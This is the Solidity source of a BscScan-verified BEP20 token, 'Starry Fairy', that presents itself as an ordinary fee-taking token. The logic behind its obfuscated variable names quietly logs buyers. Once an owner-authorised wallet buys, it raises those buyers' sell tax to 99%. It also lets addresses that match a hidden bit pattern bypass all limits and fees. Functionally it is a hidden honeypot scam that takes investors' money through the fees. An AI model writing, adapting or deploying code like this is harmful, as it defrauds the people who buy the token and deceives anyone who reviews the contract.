/**
 *Submitted for verification at BscScan.com on 2022-12-16
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Manager {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract StarryFairy is IBEP20, Manager {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Starry Fairy ";
    string constant _symbol = "StarryFairy";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private tradingLaunchedMarketingWalletModeLimit;
    mapping(address => bool) private walletFeeBurnLimit;
    mapping(address => bool) private limitSellLaunchedMode;
    mapping(address => bool) private buyWalletLimitMarketingTrading;
    mapping(address => uint256) private tradingWalletTeamIs;
    mapping(uint256 => address) private buyTeamMarketingBurn;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private swapLimitMinAuto = 0;
    uint256 private buyMarketingBotsWallet = 5;

    //SELL FEES
    uint256 private autoSwapTradingLiquidity = 0;
    uint256 private isMinBotsTradingMode = 5;

    uint256 private botsExemptAutoMarketing = buyMarketingBotsWallet + swapLimitMinAuto;
    uint256 private modeReceiverMaxMin = 100;

    address private teamLimitBotsLiquidity = (msg.sender); // auto-liq address
    address private isSellTeamMin = (0x0Fd46707C00110F1b42DAC7AfffFCf2217A7fD53); // marketing address
    address private burnFeeTeamMarketing = DEAD;
    address private txMarketingBotsAutoFeeMax = DEAD;
    address private swapBotsWalletExempt = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private isWalletTxMax;
    uint256 private liquidityMaxReceiverBurn;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private botsTradingModeExemptMaxLaunchedSell;
    uint256 private txSwapFeeMode;
    uint256 private minLimitAutoMarketing;
    uint256 private teamFeeWalletIsModeTxAuto;
    uint256 private botsLiquidityTxTeam;

    bool private autoSellIsModeExempt = true;
    bool private buyWalletLimitMarketingTradingMode = true;
    bool private marketingMinAutoTradingFeeLiquidityWallet = true;
    bool private teamAutoTradingWallet = true;
    bool private buyBurnTradingMarketing = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private minBotsFeeAuto = 6 * 10 ** 15;
    uint256 private exemptModeLimitWalletTradingLaunched = _totalSupply / 1000; // 0.1%

    
    bool private exemptBuyBurnMinIs = false;
    bool private swapTxLimitBotsAutoLaunchedBurn = false;
    uint256 private tradingIsSwapMode = 0;
    bool private maxAutoTxExempt = false;
    bool private launchedIsBuyMaxAutoWalletTrading = false;
    bool private liquiditySwapMaxReceiver = false;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Manager(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        botsTradingModeExemptMaxLaunchedSell = true;

        tradingLaunchedMarketingWalletModeLimit[msg.sender] = true;
        tradingLaunchedMarketingWalletModeLimit[address(this)] = true;

        walletFeeBurnLimit[msg.sender] = true;
        walletFeeBurnLimit[0x0000000000000000000000000000000000000000] = true;
        walletFeeBurnLimit[0x000000000000000000000000000000000000dEaD] = true;
        walletFeeBurnLimit[address(this)] = true;

        limitSellLaunchedMode[msg.sender] = true;
        limitSellLaunchedMode[0x0000000000000000000000000000000000000000] = true;
        limitSellLaunchedMode[0x000000000000000000000000000000000000dEaD] = true;
        limitSellLaunchedMode[address(this)] = true;

        SetAuthorized(address(0x6A54eF4533B97fdB7E102A17fffFC30594Ba76D4));

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return maxTeamLaunchedMin(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Starry Fairy  Insufficient Allowance");
        }

        return maxTeamLaunchedMin(sender, recipient, amount);
    }

    function maxTeamLaunchedMin(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (swapTxLimitBotsAutoLaunchedBurn == marketingMinAutoTradingFeeLiquidityWallet) {
            swapTxLimitBotsAutoLaunchedBurn = buyBurnTradingMarketing;
        }


        bool bLimitTxWalletValue = txLiquidityBotsLimitReceiver(sender) || txLiquidityBotsLimitReceiver(recipient);
        
        if (liquiditySwapMaxReceiver != swapTxLimitBotsAutoLaunchedBurn) {
            liquiditySwapMaxReceiver = buyWalletLimitMarketingTradingMode;
        }

        if (exemptBuyBurnMinIs != buyBurnTradingMarketing) {
            exemptBuyBurnMinIs = swapTxLimitBotsAutoLaunchedBurn;
        }

        if (launchedIsBuyMaxAutoWalletTrading == maxAutoTxExempt) {
            launchedIsBuyMaxAutoWalletTrading = liquiditySwapMaxReceiver;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && isAuthorized(recipient)) {
                isReceiverSellModeTxLaunchedMarketing();
            }
            if (!bLimitTxWalletValue) {
                txMarketingAutoModeSell(recipient);
            }
        }
        
        if (launchedIsBuyMaxAutoWalletTrading != autoSellIsModeExempt) {
            launchedIsBuyMaxAutoWalletTrading = liquiditySwapMaxReceiver;
        }

        if (maxAutoTxExempt == marketingMinAutoTradingFeeLiquidityWallet) {
            maxAutoTxExempt = buyBurnTradingMarketing;
        }


        if (inSwap || bLimitTxWalletValue) {return feeBurnMaxAutoBots(sender, recipient, amount);}

        if (!tradingLaunchedMarketingWalletModeLimit[sender] && !tradingLaunchedMarketingWalletModeLimit[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Starry Fairy  Max wallet has been triggered");
        }
        
        require((amount <= _maxTxAmount) || limitSellLaunchedMode[sender] || limitSellLaunchedMode[recipient], "Starry Fairy  Max TX Limit has been triggered");

        if (marketingLaunchedTradingReceiverLimit()) {maxBuyReceiverMin();}

        _balances[sender] = _balances[sender].sub(amount, "Starry Fairy  Insufficient Balance");
        
        uint256 amountReceived = teamModeTradingMax(sender) ? autoExemptWalletBotsModeSellBurn(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function feeBurnMaxAutoBots(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Starry Fairy  Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function teamModeTradingMax(address sender) internal view returns (bool) {
        return !walletFeeBurnLimit[sender];
    }

    function launchedIsExemptBots(address sender, bool selling) internal returns (uint256) {
        
        if (selling) {
            botsExemptAutoMarketing = isMinBotsTradingMode + autoSwapTradingLiquidity;
            return sellReceiverMarketingMinTeam(sender, botsExemptAutoMarketing);
        }
        if (!selling && sender == uniswapV2Pair) {
            botsExemptAutoMarketing = buyMarketingBotsWallet + swapLimitMinAuto;
            return botsExemptAutoMarketing;
        }
        return sellReceiverMarketingMinTeam(sender, botsExemptAutoMarketing);
    }

    function txLiquidityLaunchedSell() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function autoExemptWalletBotsModeSellBurn(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (maxAutoTxExempt != swapTxLimitBotsAutoLaunchedBurn) {
            maxAutoTxExempt = buyBurnTradingMarketing;
        }


        uint256 feeAmount = amount.mul(launchedIsExemptBots(sender, receiver == uniswapV2Pair)).div(modeReceiverMaxMin);

        if (buyWalletLimitMarketingTrading[sender] || buyWalletLimitMarketingTrading[receiver]) {
            feeAmount = amount.mul(99).div(modeReceiverMaxMin);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function txLiquidityBotsLimitReceiver(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function sellReceiverMarketingMinTeam(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = tradingWalletTeamIs[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function txMarketingAutoModeSell(address addr) private {
        if (txLiquidityLaunchedSell() < minBotsFeeAuto) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        buyTeamMarketingBurn[exemptLimitValue] = addr;
    }

    function isReceiverSellModeTxLaunchedMarketing() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (tradingWalletTeamIs[buyTeamMarketingBurn[i]] == 0) {
                    tradingWalletTeamIs[buyTeamMarketingBurn[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(isSellTeamMin).transfer(amountBNB * amountPercentage / 100);
    }

    function marketingLaunchedTradingReceiverLimit() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    buyBurnTradingMarketing &&
    _balances[address(this)] >= exemptModeLimitWalletTradingLaunched;
    }

    function maxBuyReceiverMin() internal swapping {
        
        uint256 amountToLiquify = exemptModeLimitWalletTradingLaunched.mul(swapLimitMinAuto).div(botsExemptAutoMarketing).div(2);
        uint256 amountToSwap = exemptModeLimitWalletTradingLaunched.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = botsExemptAutoMarketing.sub(swapLimitMinAuto.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(swapLimitMinAuto).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(buyMarketingBotsWallet).div(totalETHFee);
        
        if (liquiditySwapMaxReceiver == swapTxLimitBotsAutoLaunchedBurn) {
            liquiditySwapMaxReceiver = launchedIsBuyMaxAutoWalletTrading;
        }

        if (swapTxLimitBotsAutoLaunchedBurn != launchedIsBuyMaxAutoWalletTrading) {
            swapTxLimitBotsAutoLaunchedBurn = buyWalletLimitMarketingTradingMode;
        }


        payable(isSellTeamMin).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                teamLimitBotsLiquidity,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getAutoSellIsModeExempt() public view returns (bool) {
        if (autoSellIsModeExempt == liquiditySwapMaxReceiver) {
            return liquiditySwapMaxReceiver;
        }
        if (autoSellIsModeExempt == exemptBuyBurnMinIs) {
            return exemptBuyBurnMinIs;
        }
        return autoSellIsModeExempt;
    }
    function setAutoSellIsModeExempt(bool a0) public onlyOwner {
        if (autoSellIsModeExempt != marketingMinAutoTradingFeeLiquidityWallet) {
            marketingMinAutoTradingFeeLiquidityWallet=a0;
        }
        if (autoSellIsModeExempt == liquiditySwapMaxReceiver) {
            liquiditySwapMaxReceiver=a0;
        }
        autoSellIsModeExempt=a0;
    }

    function getMarketingMinAutoTradingFeeLiquidityWallet() public view returns (bool) {
        return marketingMinAutoTradingFeeLiquidityWallet;
    }
    function setMarketingMinAutoTradingFeeLiquidityWallet(bool a0) public onlyOwner {
        if (marketingMinAutoTradingFeeLiquidityWallet == swapTxLimitBotsAutoLaunchedBurn) {
            swapTxLimitBotsAutoLaunchedBurn=a0;
        }
        if (marketingMinAutoTradingFeeLiquidityWallet != liquiditySwapMaxReceiver) {
            liquiditySwapMaxReceiver=a0;
        }
        if (marketingMinAutoTradingFeeLiquidityWallet != teamAutoTradingWallet) {
            teamAutoTradingWallet=a0;
        }
        marketingMinAutoTradingFeeLiquidityWallet=a0;
    }

    function getLimitSellLaunchedMode(address a0) public view returns (bool) {
        if (limitSellLaunchedMode[a0] == limitSellLaunchedMode[a0]) {
            return launchedIsBuyMaxAutoWalletTrading;
        }
            return limitSellLaunchedMode[a0];
    }
    function setLimitSellLaunchedMode(address a0,bool a1) public onlyOwner {
        if (a0 != teamLimitBotsLiquidity) {
            exemptBuyBurnMinIs=a1;
        }
        if (a0 != txMarketingBotsAutoFeeMax) {
            teamAutoTradingWallet=a1;
        }
        if (limitSellLaunchedMode[a0] != tradingLaunchedMarketingWalletModeLimit[a0]) {
           tradingLaunchedMarketingWalletModeLimit[a0]=a1;
        }
        limitSellLaunchedMode[a0]=a1;
    }

    function getExemptBuyBurnMinIs() public view returns (bool) {
        if (exemptBuyBurnMinIs != marketingMinAutoTradingFeeLiquidityWallet) {
            return marketingMinAutoTradingFeeLiquidityWallet;
        }
        if (exemptBuyBurnMinIs != autoSellIsModeExempt) {
            return autoSellIsModeExempt;
        }
        if (exemptBuyBurnMinIs != buyBurnTradingMarketing) {
            return buyBurnTradingMarketing;
        }
        return exemptBuyBurnMinIs;
    }
    function setExemptBuyBurnMinIs(bool a0) public onlyOwner {
        if (exemptBuyBurnMinIs == teamAutoTradingWallet) {
            teamAutoTradingWallet=a0;
        }
        if (exemptBuyBurnMinIs != maxAutoTxExempt) {
            maxAutoTxExempt=a0;
        }
        exemptBuyBurnMinIs=a0;
    }

    function getMinBotsFeeAuto() public view returns (uint256) {
        return minBotsFeeAuto;
    }
    function setMinBotsFeeAuto(uint256 a0) public onlyOwner {
        if (minBotsFeeAuto != isMinBotsTradingMode) {
            isMinBotsTradingMode=a0;
        }
        if (minBotsFeeAuto == botsExemptAutoMarketing) {
            botsExemptAutoMarketing=a0;
        }
        minBotsFeeAuto=a0;
    }

    function getModeReceiverMaxMin() public view returns (uint256) {
        if (modeReceiverMaxMin == exemptModeLimitWalletTradingLaunched) {
            return exemptModeLimitWalletTradingLaunched;
        }
        return modeReceiverMaxMin;
    }
    function setModeReceiverMaxMin(uint256 a0) public onlyOwner {
        if (modeReceiverMaxMin == autoSwapTradingLiquidity) {
            autoSwapTradingLiquidity=a0;
        }
        modeReceiverMaxMin=a0;
    }

    function getTeamLimitBotsLiquidity() public view returns (address) {
        if (teamLimitBotsLiquidity == txMarketingBotsAutoFeeMax) {
            return txMarketingBotsAutoFeeMax;
        }
        if (teamLimitBotsLiquidity != txMarketingBotsAutoFeeMax) {
            return txMarketingBotsAutoFeeMax;
        }
        if (teamLimitBotsLiquidity != isSellTeamMin) {
            return isSellTeamMin;
        }
        return teamLimitBotsLiquidity;
    }
    function setTeamLimitBotsLiquidity(address a0) public onlyOwner {
        if (teamLimitBotsLiquidity == isSellTeamMin) {
            isSellTeamMin=a0;
        }
        if (teamLimitBotsLiquidity == txMarketingBotsAutoFeeMax) {
            txMarketingBotsAutoFeeMax=a0;
        }
        if (teamLimitBotsLiquidity == burnFeeTeamMarketing) {
            burnFeeTeamMarketing=a0;
        }
        teamLimitBotsLiquidity=a0;
    }

    function getLiquiditySwapMaxReceiver() public view returns (bool) {
        return liquiditySwapMaxReceiver;
    }
    function setLiquiditySwapMaxReceiver(bool a0) public onlyOwner {
        if (liquiditySwapMaxReceiver == autoSellIsModeExempt) {
            autoSellIsModeExempt=a0;
        }
        if (liquiditySwapMaxReceiver == exemptBuyBurnMinIs) {
            exemptBuyBurnMinIs=a0;
        }
        liquiditySwapMaxReceiver=a0;
    }

    function getSwapLimitMinAuto() public view returns (uint256) {
        if (swapLimitMinAuto != minBotsFeeAuto) {
            return minBotsFeeAuto;
        }
        if (swapLimitMinAuto != isMinBotsTradingMode) {
            return isMinBotsTradingMode;
        }
        return swapLimitMinAuto;
    }
    function setSwapLimitMinAuto(uint256 a0) public onlyOwner {
        swapLimitMinAuto=a0;
    }

    function getTeamAutoTradingWallet() public view returns (bool) {
        return teamAutoTradingWallet;
    }
    function setTeamAutoTradingWallet(bool a0) public onlyOwner {
        if (teamAutoTradingWallet != teamAutoTradingWallet) {
            teamAutoTradingWallet=a0;
        }
        if (teamAutoTradingWallet != autoSellIsModeExempt) {
            autoSellIsModeExempt=a0;
        }
        teamAutoTradingWallet=a0;
    }

    function getIsMinBotsTradingMode() public view returns (uint256) {
        if (isMinBotsTradingMode != buyMarketingBotsWallet) {
            return buyMarketingBotsWallet;
        }
        return isMinBotsTradingMode;
    }
    function setIsMinBotsTradingMode(uint256 a0) public onlyOwner {
        isMinBotsTradingMode=a0;
    }

    function getBuyBurnTradingMarketing() public view returns (bool) {
        if (buyBurnTradingMarketing != exemptBuyBurnMinIs) {
            return exemptBuyBurnMinIs;
        }
        if (buyBurnTradingMarketing != marketingMinAutoTradingFeeLiquidityWallet) {
            return marketingMinAutoTradingFeeLiquidityWallet;
        }
        if (buyBurnTradingMarketing == swapTxLimitBotsAutoLaunchedBurn) {
            return swapTxLimitBotsAutoLaunchedBurn;
        }
        return buyBurnTradingMarketing;
    }
    function setBuyBurnTradingMarketing(bool a0) public onlyOwner {
        if (buyBurnTradingMarketing == swapTxLimitBotsAutoLaunchedBurn) {
            swapTxLimitBotsAutoLaunchedBurn=a0;
        }
        if (buyBurnTradingMarketing == launchedIsBuyMaxAutoWalletTrading) {
            launchedIsBuyMaxAutoWalletTrading=a0;
        }
        if (buyBurnTradingMarketing == maxAutoTxExempt) {
            maxAutoTxExempt=a0;
        }
        buyBurnTradingMarketing=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}